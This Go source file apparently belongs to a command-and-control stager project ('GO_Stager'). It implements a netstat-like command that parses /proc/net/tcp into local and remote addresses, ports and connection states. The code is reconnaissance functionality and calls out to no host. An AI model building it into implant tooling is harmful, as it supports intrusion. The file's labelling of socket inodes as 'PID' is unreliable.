package Command

import (
	"GO_Stager/util"
	"bufio"
	"os"
	"strconv"
	"strings"
)

func parseHexIP(hexIP string) string {
	// 反转字节顺序
	ip := make([]string, 4)
	for i := 0; i < 4; i++ {
		val, _ := strconv.ParseInt(hexIP[i*2:i*2+2], 16, 64)
		ip[3-i] = util.Sprintf("%d", val)
	}
	return strings.Join(ip, ".")
}

func parseHexRes(hexAddr string) (string, int, error) {
	addrParts := strings.Split(hexAddr, ":")
	AddrHex := parseHexIP(addrParts[0])

	portHex := addrParts[1]
	port, err := strconv.ParseInt(portHex, 16, 32)
	if err != nil {
		return "", 0, util.Errorf("Failed to parse port: %v", err)
	}
	return AddrHex, int(port), nil
}

func getState(stateHex string) string {
	states := map[string]string{
		"01": "ESTABLISHED",
		"02": "SYN_SENT",
		"03": "SYN_RECV",
		"04": "FIN_WAIT1",
		"05": "FIN_WAIT2",
		"06": "TIME_WAIT",
		"07": "CLOSE",
		"08": "CLOSE_WAIT",
		"09": "LAST_ACK",
		"0A": "LISTEN",
		"0B": "CLOSING",
		"0C": "NEW_SYN_RECV",
	}
	return states[stateHex]
}

func parseTcpFile() (string, error) {
	file, err := os.Open("/proc/net/tcp")
	if err != nil {
		return "", err
	}
	defer file.Close()
	var result strings.Builder
	// 解析 /proc/net/tcp
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		// 跳过标题行
		if strings.HasPrefix(line, " sl ") {
			continue
		}

		// 分割每一行的字段
		fields := strings.Fields(line)
		if len(fields) < 10 {
			continue
		}

		// 获取 inode 信息
		inode, err := strconv.Atoi(fields[9])
		if err != nil {
			continue
		}
		localAddress := fields[1]
		remoteAddress := fields[2]
		stateHex := fields[3]
		mystate := getState(stateHex)

		// 解析端口号
		localAddress, localPort, _ := parseHexRes(localAddress)
		remoteAddress, remotePort, _ := parseHexRes(remoteAddress)

		result.WriteString(util.Sprintf("PID: %d Local Address: %s:%d, Remote Address: %s:%d, State: %s\n", inode, localAddress, localPort, remoteAddress, remotePort, mystate))

	}

	if err := scanner.Err(); err != nil {
		return "", err
	}

	return result.String(), nil
}
